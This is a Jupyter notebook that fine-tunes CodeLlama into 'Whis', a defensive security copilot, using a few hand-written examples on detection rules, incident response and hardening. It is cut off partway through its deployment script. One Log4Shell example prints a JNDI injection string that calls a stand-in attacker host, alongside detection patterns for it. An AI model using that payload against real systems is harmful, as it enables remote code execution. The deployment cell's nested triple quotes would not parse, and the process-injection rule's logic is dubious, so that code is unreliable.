{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Whis Cybersecurity LLM Fine-tuning Pipeline\n",
    "\n",
    "Fine-tuning CodeLlama-7B-Instruct for cybersecurity operations:\n",
    "- **CKS** (Certified Kubernetes Security)\n",
    "- **CCSP** (Certified Cloud Security Professional) \n",
    "- **SOAR** (Security Orchestration, Automation & Response)\n",
    "- **Splunk** SIEM operations\n",
    "- **LimaCharlie** EDR/XDR\n",
    "- **MITRE ATT&CK** framework\n",
    "- **NIST** Cybersecurity Framework\n",
    "- **CVE** vulnerability analysis\n",
    "\n",
    "**Target**: Create Whis - the SOAR Copilot that explains security events and proposes response actions."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## üîß Environment Setup"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Install required packages\n",
    "!pip install -q transformers>=4.40.0 \\\n",
    "    torch>=2.1.0 \\\n",
    "    peft>=0.7.0 \\\n",
    "    bitsandbytes>=0.41.0 \\\n",
    "    datasets>=2.16.0 \\\n",
    "    accelerate>=0.25.0 \\\n",
    "    tensorboard>=2.15.0 \\\n",
    "    wandb>=0.16.0 \\\n",
    "    huggingface_hub>=0.19.0 \\\n",
    "    trl>=0.7.0"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import torch\n",
    "import torch.nn as nn\n",
    "import transformers\n",
    "from transformers import (\n",
    "    AutoTokenizer,\n",
    "    AutoModelForCausalLM,\n",
    "    TrainingArguments,\n",
    "    Trainer,\n",
    "    DataCollatorForLanguageModeling,\n",
    "    BitsAndBytesConfig\n",
    ")\n",
    "from peft import (\n",
    "    LoraConfig,\n",
    "    get_peft_model,\n",
    "    prepare_model_for_kbit_training,\n",
    "    TaskType\n",
    ")\n",
    "from datasets import Dataset, DatasetDict\n",
    "import pandas as pd\n",
    "import numpy as np\n",
    "import json\n",
    "import os\n",
    "from datetime import datetime\n",
    "import warnings\n",
    "warnings.filterwarnings('ignore')\n",
    "\n",
    "# Import our model configuration\n",
    "import sys\n",
    "sys.path.append('../')\n",
    "from model_config import WhisModelConfig, CYBERSEC_DOMAINS\n",
    "\n",
    "print(f\"üêç Python: {sys.version}\")\n",
    "print(f\"üî• PyTorch: {torch.__version__}\")\n",
    "print(f\"ü§ó Transformers: {transformers.__version__}\")\n",
    "print(f\"üöÄ CUDA Available: {torch.cuda.is_available()}\")\n",
    "if torch.cuda.is_available():\n",
    "    print(f\"üíæ GPU Memory: {torch.cuda.get_device_properties(0).total_memory / 1e9:.1f} GB\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## üéØ Model Configuration"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Initialize Whis model configuration\n",
    "config = WhisModelConfig()\n",
    "\n",
    "print(\"üéØ Whis Cybersecurity LLM Configuration:\")\n",
    "print(f\"üì¶ Base Model: {config.base_model_id}\")\n",
    "print(f\"üè∑Ô∏è Model Name: {config.model_name}\")\n",
    "print(f\"üìè Max Sequence Length: {config.max_sequence_length}\")\n",
    "print(f\"üéõÔ∏è Temperature: {config.temperature}\")\n",
    "print(f\"üîÄ Use LoRA: {config.use_lora}\")\n",
    "print(f\"üìâ Use 4-bit Quantization: {config.use_4bit}\")\n",
    "\n",
    "print(\"\\nüõ°Ô∏è Cybersecurity Training Domains:\")\n",
    "for domain, info in CYBERSEC_DOMAINS.items():\n",
    "    print(f\"  ‚Ä¢ {domain}: {info['description']}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## üìä Cybersecurity Training Data Creation"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Cybersecurity training data templates\n",
    "training_data = {\n",
    "    \"attack_techniques\": [\n",
    "        {\n",
    "            \"instruction\": \"Explain MITRE ATT&CK technique T1110 (Brute Force) and provide detection guidance.\",\n",
    "            \"input\": \"Multiple failed logon events (4625) from IP 192.168.1.100 targeting admin accounts.\",\n",
    "            \"output\": \"**ATT&CK T1110: Brute Force**\\n\\n**Analysis**: This indicates a potential brute force attack where an adversary is attempting to gain access by trying multiple password combinations.\\n\\n**Detection**: Monitor for:\\n- Multiple 4625 events (>5 in 5 minutes)\\n- Failed authentication across multiple accounts\\n- Geographic anomalies\\n\\n**Response**:\\n1. Block source IP immediately\\n2. Enable account lockout policies\\n3. Force password reset on targeted accounts\\n4. Implement MFA if not already enabled\\n\\n**Splunk Query**:\\n```\\nindex=security EventCode=4625 src_ip=\\\"192.168.1.100\\\"\\n| stats dc(user) as unique_accounts, count by src_ip\\n| where count > 5\\n```\"\n",
    "        },\n",
    "        {\n",
    "            \"instruction\": \"Analyze this potential T1566.001 (Spearphishing Attachment) incident.\",\n",
    "            \"input\": \"User received email with malicious .docm attachment, process spawned powershell.exe with suspicious arguments.\",\n",
    "            \"output\": \"**ATT&CK T1566.001: Spearphishing Attachment**\\n\\n**Analysis**: Classic spearphishing with macro-enabled document leading to PowerShell execution.\\n\\n**Immediate Actions**:\\n1. Isolate affected workstation\\n2. Block email sender/domain\\n3. Hunt for similar emails across organization\\n\\n**LimaCharlie Detection**:\\n```yaml\\nevent: NEW_PROCESS\\nop: and\\nrules:\\n  - op: contains\\n    path: event/FILE_PATH\\n    value: powershell.exe\\n  - op: contains\\n    path: event/COMMAND_LINE\\n    value: -EncodedCommand\\n```\\n\\n**Investigation**: Check for C2 communication, credential dumping, lateral movement indicators.\"\n",
    "        }\n",
    "    ],\n",
    "    \n",
    "    \"detection_rules\": [\n",
    "        {\n",
    "            \"instruction\": \"Create a Splunk detection rule for potential privilege escalation.\",\n",
    "            \"input\": \"Detect when a process gains debug privileges (SeDebugPrivilege) which could indicate privilege escalation.\",\n",
    "            \"output\": \"```spl\\nindex=security sourcetype=WinEventLog:Security EventCode=4672\\n| search Privileges=*SeDebugPrivilege*\\n| eval privilege_list=split(Privileges, \\\",\\\")\\n| where match(Privileges, \\\"SeDebugPrivilege\\\")\\n| stats count by Account_Name, Computer_Name, _time\\n| where count > 1\\n| eval severity=\\\"High\\\"\\n| eval description=\\\"Process gained SeDebugPrivilege - potential privilege escalation\\\"\\n```\\n\\n**Detection Logic**:\\n- Monitor Event 4672 (Special privileges assigned)\\n- Filter for SeDebugPrivilege\\n- Alert on unusual accounts gaining this privilege\\n\\n**False Positives**: Legitimate debugging tools, system processes\"\n",
    "        },\n",
    "        {\n",
    "            \"instruction\": \"Write a LimaCharlie D&R rule for detecting process injection.\",\n",
    "            \"input\": \"Detect when a process injects code into another process using common APIs like CreateRemoteThread.\",\n",
    "            \"output\": \"```yaml\\ndetect:\\n  event: NEW_PROCESS\\n  op: and\\n  rules:\\n    - op: exists\\n      path: event/PARENT\\n    - op: contains\\n      path: event/COMMAND_LINE\\n      value: CreateRemoteThread\\n      case_sensitive: false\\n    - op: or\\n      rules:\\n        - op: contains\\n          path: event/COMMAND_LINE\\n          value: VirtualAllocEx\\n        - op: contains\\n          path: event/COMMAND_LINE\\n          value: WriteProcessMemory\\n\\nrespond:\\n  - action: report\\n    name: process_injection_detected\\n  - action: isolation\\n    duration: 3600\\n    reason: Potential process injection detected\\n```\\n\\n**Rule Name**: Process Injection Detection\\n**Severity**: High\\n**MITRE**: T1055 Process Injection\"\n",
    "        }\n",
    "    ],\n",
    "    \n",
    "    \"incident_response\": [\n",
    "        {\n",
    "            \"instruction\": \"Create an incident response playbook for ransomware detection.\",\n",
    "            \"input\": \"Multiple files being encrypted rapidly, suspicious process names, and potential ransom note creation detected.\",\n",
    "            \"output\": \"**üö® RANSOMWARE INCIDENT RESPONSE PLAYBOOK**\\n\\n**IMMEDIATE (0-5 minutes)**:\\n1. **Network Isolation**: Disconnect affected systems\\n2. **Process Termination**: Kill suspicious encryption processes\\n3. **Stakeholder Notification**: Alert CISO and incident team\\n\\n**CONTAINMENT (5-30 minutes)**:\\n1. Identify all affected systems via network analysis\\n2. Isolate entire network segment if widespread\\n3. Preserve system images for forensic analysis\\n4. Check backup integrity and isolation\\n\\n**ERADICATION (30-120 minutes)**:\\n1. Identify initial attack vector\\n2. Remove malware and persistence mechanisms\\n3. Patch vulnerabilities used for initial access\\n4. Reset all potentially compromised credentials\\n\\n**RECOVERY**:\\n1. Restore from verified clean backups\\n2. Gradual network reconnection with monitoring\\n3. Enhanced logging and detection\\n\\n**Splunk Hunting**:\\n```\\nindex=endpoint \\\"*.encrypted\\\" OR \\\"*.locked\\\" OR \\\"README.txt\\\"\\n| stats count by host\\n| where count > 100\\n```\"\n",
    "        }\n",
    "    ],\n",
    "    \n",
    "    \"cloud_security\": [\n",
    "        {\n",
    "            \"instruction\": \"Explain Kubernetes security best practices for CKS certification.\",\n",
    "            \"input\": \"What are the key security controls for container runtime security in Kubernetes?\",\n",
    "            \"output\": \"**üõ°Ô∏è Kubernetes Container Runtime Security (CKS)**\\n\\n**1. Pod Security Standards**:\\n```yaml\\napiVersion: v1\\nkind: Namespace\\nmetadata:\\n  name: secure-namespace\\n  labels:\\n    pod-security.kubernetes.io/enforce: restricted\\n    pod-security.kubernetes.io/audit: restricted\\n    pod-security.kubernetes.io/warn: restricted\\n```\\n\\n**2. Security Contexts**:\\n```yaml\\nsecurityContext:\\n  runAsNonRoot: true\\n  runAsUser: 1000\\n  readOnlyRootFilesystem: true\\n  allowPrivilegeEscalation: false\\n  capabilities:\\n    drop:\\n      - ALL\\n```\\n\\n**3. Network Policies**:\\n```yaml\\napiVersion: networking.k8s.io/v1\\nkind: NetworkPolicy\\nmetadata:\\n  name: deny-all\\nspec:\\n  podSelector: {}\\n  policyTypes:\\n  - Ingress\\n  - Egress\\n```\\n\\n**4. Runtime Protection**:\\n- Use Falco for runtime security monitoring\\n- Implement admission controllers\\n- Regular vulnerability scanning with Trivy\\n- Restrict privileged containers\"\n",
    "        }\n",
    "    ],\n",
    "    \n",
    "    \"vulnerability_analysis\": [\n",
    "        {\n",
    "            \"instruction\": \"Analyze CVE-2021-44228 (Log4Shell) and provide mitigation guidance.\",\n",
    "            \"input\": \"Java application using Log4j library version 2.14.1, potential LDAP injection vulnerability.\",\n",
    "            \"output\": \"**üî¥ CVE-2021-44228: Apache Log4j RCE (Log4Shell)**\\n\\n**Severity**: Critical (CVSS 10.0)\\n**Impact**: Remote Code Execution\\n\\n**Vulnerable Versions**:\\n- Log4j 2.0-beta9 through 2.15.0 (excluding 2.12.2)\\n\\n**Attack Vector**:\\n```\\n${jndi:ldap://attacker.com/exploit}\\n```\\n\\n**Detection**:\\n```spl\\nindex=web \\\"${jndi:\" OR \\\"${${::-j}\" OR \\\"${${lower:j}\\\"\\n| rex field=_raw \\\"(?<jndi_pattern>\\\\$\\\\{jndi:[^}]+\\\\})\\\"\\n| stats count by src_ip, jndi_pattern\\n```\\n\\n**Immediate Mitigation**:\\n1. **Upgrade**: Log4j 2.17.0+ (or 2.12.3 for Java 7)\\n2. **WAF Rules**: Block ${jndi: patterns\\n3. **JVM Flag**: -Dlog4j2.formatMsgNoLookups=true\\n4. **Environment**: LOG4J_FORMAT_MSG_NO_LOOKUPS=true\\n\\n**Network Monitoring**:\\n- Monitor outbound LDAP (389) and RMI (1099) connections\\n- Block suspicious domains in DNS\\n- Hunt for Java processes making external connections\"\n",
    "        }\n",
    "    ]\n",
    "}\n",
    "\n",
    "print(\"üìä Training Data Categories Created:\")\n",
    "for category, examples in training_data.items():\n",
    "    print(f\"  ‚Ä¢ {category}: {len(examples)} examples\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Expand training data with additional cybersecurity content\n",
    "def create_comprehensive_training_data():\n",
    "    \"\"\"Generate comprehensive cybersecurity training examples\"\"\"\n",
    "    \n",
    "    # NIST Cybersecurity Framework\n",
    "    training_data[\"nist_framework\"] = [\n",
    "        {\n",
    "            \"instruction\": \"Explain the NIST Cybersecurity Framework Identify function.\",\n",
    "            \"input\": \"Organization needs to establish cybersecurity baseline and risk assessment.\",\n",
    "            \"output\": \"**NIST CSF: IDENTIFY (ID)**\\n\\n**Purpose**: Develop organizational understanding of cybersecurity risk to systems, people, assets, data, and capabilities.\\n\\n**Categories**:\\n\\n**ID.AM (Asset Management)**:\\n- Catalog all hardware, software, and data assets\\n- Maintain asset inventory with criticality ratings\\n- Document asset ownership and responsibilities\\n\\n**ID.BE (Business Environment)**:\\n- Understand organization's mission and stakeholders\\n- Define cybersecurity's role in business objectives\\n- Map dependencies and supply chain relationships\\n\\n**ID.GV (Governance)**:\\n- Establish cybersecurity policy and procedures\\n- Define roles and responsibilities\\n- Ensure legal and regulatory compliance\\n\\n**ID.RA (Risk Assessment)**:\\n- Identify and document cybersecurity risks\\n- Update risk assessments regularly\\n- Use threat intelligence for risk analysis\\n\\n**ID.RM (Risk Management Strategy)**:\\n- Establish risk tolerance levels\\n- Determine risk response strategies\\n- Integrate cybersecurity into business planning\"\n",
    "        }\n",
    "    ]\n",
    "    \n",
    "    # SOAR Automation\n",
    "    training_data[\"soar_automation\"] = [\n",
    "        {\n",
    "            \"instruction\": \"Design a SOAR playbook for phishing email investigation.\",\n",
    "            \"input\": \"Suspicious email reported by user, need automated investigation and response.\",\n",
    "            \"output\": \"**üìß PHISHING EMAIL INVESTIGATION PLAYBOOK**\\n\\n**Trigger**: User reports suspicious email\\n\\n**Automated Actions**:\\n\\n**1. Email Analysis**:\\n```python\\n# Extract email metadata\\nheaders = extract_email_headers(email_id)\\nsender_reputation = check_sender_reputation(headers['from'])\\nurl_analysis = analyze_urls(email_body)\\nattachment_analysis = scan_attachments(email_attachments)\\n```\\n\\n**2. Threat Intelligence**:\\n```python\\n# Check against threat feeds\\nioc_matches = query_threat_intel(indicators)\\nsimilar_campaigns = find_similar_emails(email_hash)\\n```\\n\\n**3. User Impact Assessment**:\\n```python\\n# Check if user clicked links or downloaded attachments\\nuser_activity = check_user_actions(user_id, email_timestamp)\\nif user_activity['clicked_link']:\\n    isolate_workstation(user_workstation)\\n```\\n\\n**4. Response Actions**:\\n- **Low Risk**: Add to monitoring list\\n- **Medium Risk**: Quarantine email, alert SOC\\n- **High Risk**: Isolate user, reset credentials, hunt for similar emails\\n\\n**Human Approval**: Required for isolation and credential reset\"\n",
    "        }\n",
    "    ]\n",
    "    \n",
    "    # Splunk Administration\n",
    "    training_data[\"splunk_admin\"] = [\n",
    "        {\n",
    "            \"instruction\": \"Configure Splunk for security monitoring and create correlation rules.\",\n",
    "            \"input\": \"Need to set up Splunk to detect lateral movement and privilege escalation.\",\n",
    "            \"output\": \"**üîç Splunk Security Monitoring Configuration**\\n\\n**Index Configuration**:\\n```conf\\n# indexes.conf\\n[security]\\nhomePath = $SPLUNK_DB/security/db\\ncoldPath = $SPLUNK_DB/security/colddb\\nthawedPath = $SPLUNK_DB/security/thaweddb\\nmaxDataSize = auto_high_volume\\nmaxHotBuckets = 10\\nmaxWarmDBCount = 300\\n```\\n\\n**Data Models**:\\n```spl\\n| datamodel Authentication Authentication search\\n| eval src=coalesce(src_ip, src)\\n| eval dest=coalesce(dest_ip, dest)\\n| eval user=coalesce(user_name, user)\\n```\\n\\n**Correlation Rule - Lateral Movement**:\\n```spl\\nindex=security sourcetype=WinEventLog:Security EventCode=4624\\n| eval src_category=case(\\n    cidrmatch(\\\"10.0.0.0/8\\\", src), \\\"internal\\\",\\n    cidrmatch(\\\"192.168.0.0/16\\\", src), \\\"internal\\\",\\n    1=1, \\\"external\\\")\\n| where src_category=\\\"internal\\\"\\n| stats dc(dest) as unique_hosts by user, src\\n| where unique_hosts > 5\\n| eval risk_score=case(\\n    unique_hosts > 20, 90,\\n    unique_hosts > 10, 70,\\n    unique_hosts > 5, 50)\\n```\\n\\n**Alert Configuration**:\\n```conf\\n# savedsearches.conf\\n[Lateral Movement Detection]\\nsearch = | search index=security... \\ncron_schedule = */5 * * * *\\ndispatch.earliest_time = -10m\\naction.email = 1\\naction.email.to = soc@company.com\\n```\"\n",
    "        }\n",
    "    ]\n",
    "    \n",
    "    return training_data\n",
    "\n",
    "# Generate comprehensive training data\n",
    "comprehensive_data = create_comprehensive_training_data()\n",
    "\n",
    "print(\"\\nüìà Expanded Training Data:\")\n",
    "total_examples = 0\n",
    "for category, examples in comprehensive_data.items():\n",
    "    count = len(examples)\n",
    "    total_examples += count\n",
    "    print(f\"  ‚Ä¢ {category}: {count} examples\")\n",
    "    \n",
    "print(f\"\\nüìä Total Training Examples: {total_examples}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## üîÑ Data Preprocessing & Tokenization"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def format_instruction_data(examples):\n",
    "    \"\"\"Format training data for instruction tuning\"\"\"\n",
    "    formatted_data = []\n",
    "    \n",
    "    for category, items in examples.items():\n",
    "        for item in items:\n",
    "            # Use Alpaca-style instruction format\n",
    "            if 'input' in item and item['input'].strip():\n",
    "                formatted_text = f\"\"\"Below is an instruction that describes a cybersecurity task, paired with an input that provides further context. Write a response that appropriately completes the request.\n",
    "\n",
    "### Instruction:\n",
    "{item['instruction']}\n",
    "\n",
    "### Input:\n",
    "{item['input']}\n",
    "\n",
    "### Response:\n",
    "{item['output']}\"\"\"\n",
    "            else:\n",
    "                formatted_text = f\"\"\"Below is an instruction that describes a cybersecurity task. Write a response that appropriately completes the request.\n",
    "\n",
    "### Instruction:\n",
    "{item['instruction']}\n",
    "\n",
    "### Response:\n",
    "{item['output']}\"\"\"\n",
    "            \n",
    "            formatted_data.append({\n",
    "                'text': formatted_text,\n",
    "                'category': category,\n",
    "                'instruction': item['instruction'],\n",
    "                'input': item.get('input', ''),\n",
    "                'output': item['output']\n",
    "            })\n",
    "    \n",
    "    return formatted_data\n",
    "\n",
    "# Format training data\n",
    "formatted_training_data = format_instruction_data(comprehensive_data)\n",
    "\n",
    "print(f\"üìù Formatted {len(formatted_training_data)} training examples\")\n",
    "print(\"\\nüéØ Example formatted training data:\")\n",
    "print(\"=\" * 80)\n",
    "print(formatted_training_data[0]['text'][:500] + \"...\")\n",
    "print(\"=\" * 80)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Load tokenizer and model\n",
    "print(\"ü§ó Loading CodeLlama tokenizer and model...\")\n",
    "\n",
    "# Configure quantization\n",
    "bnb_config = config.get_bnb_config()\n",
    "\n",
    "# Load tokenizer\n",
    "tokenizer = AutoTokenizer.from_pretrained(\n",
    "    config.base_model_id,\n",
    "    trust_remote_code=True,\n",
    "    padding_side=\"left\",\n",
    "    add_eos_token=True,\n",
    "    add_bos_token=True\n",
    ")\n",
    "tokenizer.pad_token = tokenizer.eos_token\n",
    "\n",
    "# Load model with quantization\n",
    "model = AutoModelForCausalLM.from_pretrained(\n",
    "    config.base_model_id,\n",
    "    quantization_config=bnb_config,\n",
    "    device_map=\"auto\",\n",
    "    trust_remote_code=True,\n",
    "    torch_dtype=torch.float16\n",
    ")\n",
    "\n",
    "print(f\"‚úÖ Model loaded: {model.config.model_type}\")\n",
    "print(f\"üìè Vocab size: {model.config.vocab_size:,}\")\n",
    "print(f\"üß† Parameters: {model.num_parameters():,}\")\n",
    "\n",
    "# Prepare model for k-bit training\n",
    "model = prepare_model_for_kbit_training(model)\n",
    "\n",
    "# Configure LoRA\n",
    "lora_config = config.get_lora_config()\n",
    "model = get_peft_model(model, lora_config)\n",
    "\n",
    "print(f\"üîÑ LoRA configured with rank {config.lora_rank}\")\n",
    "print(f\"üìä Trainable parameters: {model.print_trainable_parameters()}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Tokenize training data\n",
    "def tokenize_function(examples):\n",
    "    \"\"\"Tokenize training examples\"\"\"\n",
    "    tokens = tokenizer(\n",
    "        examples['text'],\n",
    "        truncation=True,\n",
    "        padding=False,\n",
    "        max_length=config.max_sequence_length,\n",
    "        return_overflowing_tokens=False,\n",
    "        return_length=True\n",
    "    )\n",
    "    \n",
    "    # Set labels (for causal language modeling, labels = input_ids)\n",
    "    tokens[\"labels\"] = tokens[\"input_ids\"].copy()\n",
    "    \n",
    "    return tokens\n",
    "\n",
    "# Create dataset\n",
    "dataset = Dataset.from_list(formatted_training_data)\n",
    "\n",
    "# Split into train/validation\n",
    "train_test_split = dataset.train_test_split(test_size=0.1, seed=42)\n",
    "train_dataset = train_test_split['train']\n",
    "eval_dataset = train_test_split['test']\n",
    "\n",
    "# Tokenize datasets\n",
    "print(\"üî§ Tokenizing datasets...\")\n",
    "train_dataset = train_dataset.map(\n",
    "    tokenize_function,\n",
    "    batched=True,\n",
    "    remove_columns=train_dataset.column_names\n",
    ")\n",
    "\n",
    "eval_dataset = eval_dataset.map(\n",
    "    tokenize_function,\n",
    "    batched=True,\n",
    "    remove_columns=eval_dataset.column_names\n",
    ")\n",
    "\n",
    "print(f\"üìä Training samples: {len(train_dataset)}\")\n",
    "print(f\"üìä Validation samples: {len(eval_dataset)}\")\n",
    "print(f\"üìè Average token length: {np.mean([len(x['input_ids']) for x in train_dataset]):.0f}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## üèãÔ∏è Model Training"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Configure training arguments\n",
    "training_args = config.get_training_arguments()\n",
    "\n",
    "# Data collator for language modeling\n",
    "data_collator = DataCollatorForLanguageModeling(\n",
    "    tokenizer=tokenizer,\n",
    "    mlm=False  # Causal language modeling\n",
    ")\n",
    "\n",
    "# Initialize trainer\n",
    "trainer = Trainer(\n",
    "    model=model,\n",
    "    args=training_args,\n",
    "    train_dataset=train_dataset,\n",
    "    eval_dataset=eval_dataset,\n",
    "    tokenizer=tokenizer,\n",
    "    data_collator=data_collator\n",
    ")\n",
    "\n",
    "print(\"üèãÔ∏è Trainer initialized - ready for fine-tuning!\")\n",
    "print(f\"üìÅ Output directory: {training_args.output_dir}\")\n",
    "print(f\"üîÑ Training epochs: {training_args.num_train_epochs}\")\n",
    "print(f\"üì¶ Batch size: {training_args.per_device_train_batch_size}\")\n",
    "print(f\"üéØ Learning rate: {training_args.learning_rate}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Start training\n",
    "print(\"üöÄ Starting Whis cybersecurity fine-tuning...\")\n",
    "print(f\"‚è∞ Start time: {datetime.now()}\")\n",
    "\n",
    "# Clear memory\n",
    "torch.cuda.empty_cache()\n",
    "\n",
    "# Train the model\n",
    "trainer.train()\n",
    "\n",
    "print(f\"‚úÖ Training completed at: {datetime.now()}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## üìä Model Evaluation"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Evaluate the model\n",
    "print(\"üìä Evaluating fine-tuned model...\")\n",
    "\n",
    "eval_results = trainer.evaluate()\n",
    "\n",
    "print(\"üìà Evaluation Results:\")\n",
    "for key, value in eval_results.items():\n",
    "    print(f\"  {key}: {value:.4f}\")\n",
    "\n",
    "# Save training metrics\n",
    "with open(f\"{config.output_dir}/training_metrics.json\", \"w\") as f:\n",
    "    json.dump(eval_results, f, indent=2)\n",
    "\n",
    "print(f\"üíæ Metrics saved to {config.output_dir}/training_metrics.json\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Test the model with cybersecurity scenarios\n",
    "def test_whis_model(prompt, max_length=512):\n",
    "    \"\"\"Test the fine-tuned model with a cybersecurity prompt\"\"\"\n",
    "    inputs = tokenizer(prompt, return_tensors=\"pt\").to(model.device)\n",
    "    \n",
    "    with torch.no_grad():\n",
    "        outputs = model.generate(\n",
    "            **inputs,\n",
    "            max_length=max_length,\n",
    "            temperature=config.temperature,\n",
    "            top_p=config.top_p,\n",
    "            do_sample=config.do_sample,\n",
    "            pad_token_id=tokenizer.eos_token_id,\n",
    "            eos_token_id=tokenizer.eos_token_id\n",
    "        )\n",
    "    \n",
    "    response = tokenizer.decode(outputs[0], skip_special_tokens=True)\n",
    "    # Remove the input prompt from response\n",
    "    response = response[len(prompt):].strip()\n",
    "    \n",
    "    return response\n",
    "\n",
    "# Test scenarios\n",
    "test_scenarios = [\n",
    "    \"Below is an instruction that describes a cybersecurity task. Write a response that appropriately completes the request.\\n\\n### Instruction:\\nExplain how to detect lateral movement in a Windows environment using Splunk.\\n\\n### Response:\",\n",
    "    \n",
    "    \"Below is an instruction that describes a cybersecurity task, paired with an input that provides further context. Write a response that appropriately completes the request.\\n\\n### Instruction:\\nAnalyze this security event and recommend response actions.\\n\\n### Input:\\nMultiple PowerShell processes spawned by winword.exe with encoded commands\\n\\n### Response:\",\n",
    "    \n",
    "    \"Below is an instruction that describes a cybersecurity task. Write a response that appropriately completes the request.\\n\\n### Instruction:\\nCreate a LimaCharlie D&R rule for detecting suspicious network connections.\\n\\n### Response:\"\n",
    "]\n",
    "\n",
    "print(\"üß™ Testing fine-tuned Whis model:\")\n",
    "print(\"=\" * 100)\n",
    "\n",
    "for i, scenario in enumerate(test_scenarios, 1):\n",
    "    print(f\"\\nüéØ Test Scenario {i}:\")\n",
    "    print(\"-\" * 50)\n",
    "    \n",
    "    response = test_whis_model(scenario, max_length=800)\n",
    "    \n",
    "    print(f\"üìù Response:\")\n",
    "    print(response)\n",
    "    print(\"-\" * 50)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## üíæ Model Saving & Deployment"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Save the fine-tuned model\n",
    "print(\"üíæ Saving fine-tuned Whis model...\")\n",
    "\n",
    "# Save the LoRA adapter\n",
    "model.save_pretrained(config.output_dir)\n",
    "tokenizer.save_pretrained(config.output_dir)\n",
    "\n",
    "# Save configuration\n",
    "model_info = {\n",
    "    \"model_name\": config.model_name,\n",
    "    \"base_model\": config.base_model_id,\n",
    "    \"training_date\": datetime.now().isoformat(),\n",
    "    \"training_examples\": len(formatted_training_data),\n",
    "    \"cybersec_domains\": list(CYBERSEC_DOMAINS.keys()),\n",
    "    \"lora_config\": {\n",
    "        \"rank\": config.lora_rank,\n",
    "        \"alpha\": config.lora_alpha,\n",
    "        \"dropout\": config.lora_dropout\n",
    "    },\n",
    "    \"training_config\": {\n",
    "        \"epochs\": config.num_train_epochs,\n",
    "        \"batch_size\": config.per_device_train_batch_size,\n",
    "        \"learning_rate\": config.learning_rate\n",
    "    }\n",
    "}\n",
    "\n",
    "with open(f\"{config.output_dir}/model_info.json\", \"w\") as f:\n",
    "    json.dump(model_info, f, indent=2)\n",
    "\n",
    "print(f\"‚úÖ Model saved to: {config.output_dir}\")\n",
    "print(\"üìã Files saved:\")\n",
    "print(\"  ‚Ä¢ adapter_model.safetensors (LoRA weights)\")\n",
    "print(\"  ‚Ä¢ adapter_config.json (LoRA configuration)\")\n",
    "print(\"  ‚Ä¢ tokenizer files\")\n",
    "print(\"  ‚Ä¢ model_info.json (training metadata)\")\n",
    "print(\"  ‚Ä¢ training_metrics.json (evaluation results)\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Create deployment script\n",
    "deployment_script = f\"\"\"#!/usr/bin/env python3\n",
    "\"\"\"\n",
    "Whis Cybersecurity LLM Deployment Script\n",
    "Load and use the fine-tuned model for SOAR operations\n",
    "\"\"\"\n",
    "\n",
    "import torch\n",
    "from transformers import AutoTokenizer, AutoModelForCausalLM\n",
    "from peft import PeftModel\n",
    "import json\n",
    "\n",
    "class WhisCybersecLLM:\n",
    "    def __init__(self, model_path=\"{config.output_dir}\"):\n",
    "        print(\"üõ°Ô∏è Loading Whis Cybersecurity LLM...\")\n",
    "        \n",
    "        # Load model info\n",
    "        with open(f\"{{model_path}}/model_info.json\", \"r\") as f:\n",
    "            self.model_info = json.load(f)\n",
    "        \n",
    "        # Load base model\n",
    "        self.tokenizer = AutoTokenizer.from_pretrained(model_path)\n",
    "        base_model = AutoModelForCausalLM.from_pretrained(\n",
    "            self.model_info[\"base_model\"],\n",
    "            torch_dtype=torch.float16,\n",
    "            device_map=\"auto\"\n",
    "        )\n",
    "        \n",
    "        # Load LoRA adapter\n",
    "        self.model = PeftModel.from_pretrained(base_model, model_path)\n",
    "        self.model.eval()\n",
    "        \n",
    "        print(f\"‚úÖ {{self.model_info['model_name']}} ready for cybersecurity operations!\")\n",
    "    \n",
    "    def explain_event(self, event_description):\n",
    "        \"\"\"Teacher Mode: Explain security event with educational context\"\"\"\n",
    "        prompt = f\"\"\"Below is an instruction that describes a cybersecurity task, paired with an input that provides further context. Write a response that appropriately completes the request.\n",
    "\n",
    "### Instruction:\n",
    "Explain this security event and provide educational context including ATT&CK mapping and detection guidance.\n",
    "\n",
    "### Input:\n",
    "{{event_description}}\n",
    "\n",
    "### Response:\"\"\"\n",
    "        \n",
    "        return self._generate_response(prompt)\n",
    "    \n",
    "    def propose_response(self, incident_description):\n",
    "        \"\"\"Assistant Mode: Propose response actions and playbook routing\"\"\"\n",
    "        prompt = f\"\"\"Below is an instruction that describes a cybersecurity task, paired with an input that provides further context. Write a response that appropriately completes the request.\n",
    "\n",
    "### Instruction:\n",
